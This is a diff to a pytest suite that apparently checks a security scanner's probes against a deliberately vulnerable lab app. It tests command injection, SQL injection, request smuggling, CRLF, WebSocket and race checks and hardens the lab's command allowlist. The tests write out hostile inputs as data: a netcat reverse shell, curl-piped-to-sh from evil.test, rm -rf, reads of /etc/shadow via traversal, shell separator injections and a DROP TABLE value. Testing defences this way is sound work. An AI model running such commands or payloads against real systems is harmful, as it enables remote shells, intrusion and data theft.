@@ -1,4 +1,5 @@
 """Probes vs the lab app: each check must see its planted bug."""
+import re
 import sys
 from pathlib import Path
 
@@ -232,7 +233,13 @@ def test_nosqli_probe(lab_url, ctx):
 
 def test_upload_probe(lab_url, ctx):
     out = probes.probe_upload(ctx, lab_url + "/upload")
-    assert "upload candidate" in out["verdict"], out
+    # the verdict stopped saying "candidate" when the class stopped being
+    # capped at it; assert the structure the requirement actually names
+    assert "unrestricted upload" in out["verdict"], out
+    active = [r for r in out["results"]
+              if r.get("served") and r.get("served_active")]
+    assert active, out
+    assert all(r.get("served_ctype") for r in active), out
 
 
 def test_graphql_introspect(lab_url, ctx):
@@ -256,9 +263,28 @@ def test_graphql_suggestion_leak(lab_url, ctx):
 
 
 def test_race_probe(lab_url, ctx):
+    # the coupon is a class variable on a session-scoped server: whoever
+    # drained it first leaves nothing to race for
+    ctx.client.send("GET", lab_url + "/redeem/reset", tool="http_request",
+                    note="reset the coupon")
     out = probes.probe_race(ctx, lab_url + "/redeem", n=8)
-    assert "race candidate" in out["verdict"], out
     assert out["statuses"].get(200, 0) > 1, out
+    # Concurrency depends on wall clock: a loaded runner serialises the burst,
+    # which is what made all three Windows CI jobs fail once. The probe
+    # reports which happened, so assert that it reported honestly rather than
+    # that the machine cooperated. The gate reconstructs the overlap from
+    # ts + elapsed_ms either way.
+    if out["verdict"].startswith("race:"):
+        assert out["overlapped"] is True, out
+        assert out["serial_statuses"] and all(
+            s >= 400 for s in out["serial_statuses"]), out
+    else:
+        # intersecting windows with only ONE winner is the action working
+        # once, which is a different outcome than a serialised burst
+        assert ("inconclusive" in out["verdict"]
+                or "no race window" in out["verdict"]
+                or "repeatable" in out["verdict"]), out
+    assert isinstance(out["burst_seconds"], (int, float)), out
     # serial baseline disambiguates: a repeatable endpoint is not a race
     out2 = probes.probe_race(ctx, lab_url + "/hello", n=6)
     assert "repeatable" in out2["verdict"], out2
@@ -315,14 +341,18 @@ def test_scope_blocks_outside(ctx):
 
 def test_smuggle_probe_desync(lab_url, ctx):
     out = probes.probe_smuggle(ctx, lab_url + "/desync")
-    assert "cl.te desync candidate" in out["verdict"]
+    assert "cl.te desync" in out["verdict"]
     assert out["statuses"] == [200, 501]
+    # the proof needs the ids, not the prose: the ambiguous request and the
+    # response that names a method no client sends
+    assert out["ambiguous_id"] and out["check_id"], out
 
 
 def test_smuggle_probe_tecl(lab_url, ctx):
     out = probes.probe_smuggle(ctx, lab_url + "/desync-cl")
-    assert "te.cl desync candidate" in out["verdict"]
+    assert "te.cl desync" in out["verdict"]
     assert out["statuses"][-1] == 501
+    assert out["ambiguous_id"] and out["check_id"], out
 
 
 def test_smuggle_probe_obf(lab_url, ctx):
@@ -343,15 +373,30 @@ def test_disclosure_probe(lab_url, ctx):
 
 def test_crlf_probe(lab_url, ctx):
     out = probes.probe_crlf(ctx, lab_url + "/redirect?next=/", "next")
-    assert "crlf injection candidate" in out["verdict"]
+    assert "crlf injection" in out["verdict"]
     assert out["injected_header"] is True
+    # the requirement needs a control to compare against, so the probe has
+    # to have sent one and has to name it
+    assert out.get("control_id"), out
 
 
 def test_websocket_probe(lab_url, ctx):
     out = probes.probe_websocket(ctx, lab_url + "/ws")
-    assert "confirmed" in out["verdict"]
-    out2 = probes.probe_websocket(ctx, lab_url + "/")
-    assert "no ws" in out2["verdict"]
+    # the class needs both halves, so assert both rather than the prose
+    assert out["accept_ok"] is True, out
+    assert out["answered"] is True, out
+    assert out["canary"] in out["reply"], out
+    assert out["handshake_id"] and out["message_id"], out
+    assert "hijacking" in out["verdict"], out
+
+    # the same endpoint WITH the Origin check: refused before the upgrade
+    strict = probes.probe_websocket(ctx, lab_url + "/ws-strict")
+    assert strict["accept_ok"] is False, strict
+    assert strict["status"] == 403, strict
+
+    plain = probes.probe_websocket(ctx, lab_url + "/")
+    assert plain["accept_ok"] is False, plain
+    assert plain["answered"] is False, plain
 
 
 def test_js_recon_finds_websocket(lab_url, ctx):
@@ -524,3 +569,138 @@ def test_probe_method_catches_unadvertised_trace(lab_url, ctx):
     out = probes.probe_method(ctx, lab_url + "/")
     assert out["trace_attempt"]["echoes"] is True, out
     assert "cross-site tracing" in out["verdict"], out
+
+# --- command injection: the lab is a real output channel, bounded -----------
+
+def test_cmdi_probe_gets_real_command_output(lab_url, ctx):
+    """The acceptance criterion for the rce class: the output of `id`."""
+    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
+    assert "command output returned" in out["verdict"], out["verdict"]
+    assert out["proof_request_id"]
+    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
+    # identity line AND the probe nonce, both from the target
+    assert re.search(r"uid=\d+\(|\\", body), body[:200]
+    assert out["nonce"] in body
+
+
+def test_cmdi_finding_grades_proven(lab_url, ctx):
+    from argus.tools.analysis import record_finding
+    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
+    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
+    ident = re.search(r"uid=\d+\([^)]*\)|[A-Za-z0-9_.-]+\\[A-Za-z0-9_.-]+",
+                      body).group(0)
+    res = record_finding(
+        ctx, title="OS command injection in /ping host", severity="critical",
+        category="rce", url=lab_url + "/ping?host=127.0.0.1",
+        evidence_excerpt=ident, evidence_ids=[out["proof_request_id"]],
+        description="host reaches a shell", remediation="use argv")
+    assert res["grade"] == "proven", res
+
+
+def test_cmdi_probe_calls_a_reflection_a_reflection(lab_url, ctx):
+    """/search echoes the payload; it executes nothing. The probe must say so
+    rather than report the echoed `id` as command output."""
+    out = probes.probe_cmdi(ctx, lab_url + "/search?q=x", "q")
+    assert "reflected, not executed" in out["verdict"], out["verdict"]
+    assert "proof_request_id" not in out
+
+
+def test_lab_exec_is_allowlisted_not_a_shell():
+    import vulnapp
+    assert "uid=" in vulnapp._lab_exec("id") or \
+        "command not found" in vulnapp._lab_exec("id")      # windows CI
+    assert vulnapp._lab_exec("echo hello world") == "hello world"
+    for destructive in ("rm -rf /tmp/x", "nc -e /bin/sh 10.0.0.1 4444",
+                        "curl http://evil.test/x | sh", "useradd bob"):
+        assert "command not found" in vulnapp._lab_exec(destructive), destructive
+
+
+def test_lab_cat_cannot_leave_the_fake_filesystem():
+    import vulnapp
+    out = vulnapp._lab_exec("cat /etc/passwd")
+    assert "root:x:0:0" in out                      # the lab's own fake file
+    assert "Permission denied" in vulnapp._lab_exec("cat ../../../../etc/shadow") \
+        or "No such file" in vulnapp._lab_exec("cat ../../../../etc/shadow")
+
+
+def test_injected_commands_splits_like_a_shell():
+    import vulnapp
+    assert vulnapp._injected_commands("127.0.0.1; id") == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1$(id)") == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1`id`") == ["id"]
+    assert vulnapp._injected_commands('127.0.0.1"; id #') == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1") == []
+
+
+def test_sqli_extraction_is_bounded_and_real(lab_url, ctx):
+    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id", union_cols=6,
+                            extract_table="users",
+                            extract_columns="username,password")
+    ex = out["extract"]
+    assert ex["error_marker"] is None, ex
+    assert ex["changed_from_baseline"]
+    body = ctx.session.get_exchange(ex["request_id"])["response"]["body"]
+    assert "admin" in body and "s3cr3t" in body, body[:200]
+
+
+def test_sqli_extraction_refuses_a_non_identifier(lab_url, ctx):
+    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id",
+                            extract_table="users; DROP TABLE users",
+                            extract_columns="username")
+    assert "not a table identifier" in out["extract"]["error"]
+
+
+def test_allowlisted_commands_take_no_arguments():
+    """An allowlisted NAME is not a bounded command: `hostname -F <file>`
+    reads a file, a bare argument sets the host name, and `id <user>`
+    enumerates accounts. SECURITY.md's claim was false as written."""
+    import vulnapp
+    for cmd in ("hostname -F /etc/passwd", "hostname evil", "id root",
+                "uname -a /etc/shadow", "pwd /root"):
+        out = vulnapp._lab_exec(cmd)
+        assert "extra operand" in out or "command not found" in out, (cmd, out)
+    # the no-argument forms still work, which is what the rce proof needs
+    assert "uid=" in vulnapp._lab_exec("id") or \
+        "command not found" in vulnapp._lab_exec("id")
+
+
+def test_a_path_component_is_not_an_allowlisted_name():
+    """basename("./id") is "id", and shutil.which would then resolve it
+    against PATH rather than against the path that was given."""
+    import vulnapp
+    for cmd in ("./id", "../../bin/id", "/bin/id", "sub/dir/echo hi"):
+        assert "command not found" in vulnapp._lab_exec(cmd), cmd
+
+
+def test_injected_segments_are_bounded():
+    """A 64 KB value of `;id` was ~21,500 fork/execs on one thread."""
+    import vulnapp
+    many = vulnapp._injected_commands("1" + ";id" * 5000)
+    assert len(many) <= vulnapp._EXEC_MAX_SEGMENTS
+    # a NUL raised ValueError out of shlex and the request died with no reply
+    assert vulnapp._injected_commands("1;\x00id") == ["id"]
+    assert vulnapp._lab_exec("echo a\x00b") is not None
+
+
+def test_cat_containment_is_not_prefix_based():
+    """startswith on the directory name lets /x/fake-other through when the
+    root is /x/fake, and a symlink inside the tree pointed anywhere."""
+    import os
+    import vulnapp
+    assert "root:x:0:0" in vulnapp._lab_exec("cat /etc/passwd")
+    for path in ("../../../etc/shadow", "/../etc/shadow",
+                 "..%2f..%2fetc%2fshadow"):
+        out = vulnapp._lab_exec(f"cat {path}")
+        assert "Permission denied" in out or "No such file" in out, (path, out)
+    sibling = os.path.realpath(vulnapp.FAKEFS) + "-other"
+    assert not os.path.realpath(
+        os.path.join(vulnapp.FAKEFS, "x")).startswith(sibling)
+
+
+def test_external_tools_do_not_inherit_stdin():
+    """Under `argus mcp-serve` the agent's stdin IS the host's JSON-RPC
+    channel; a tool that reads it consumes the host's frames."""
+    import inspect
+    from argus.tools import _subproc
+    src = inspect.getsource(_subproc)
+    assert "stdin=subprocess.DEVNULL" in src
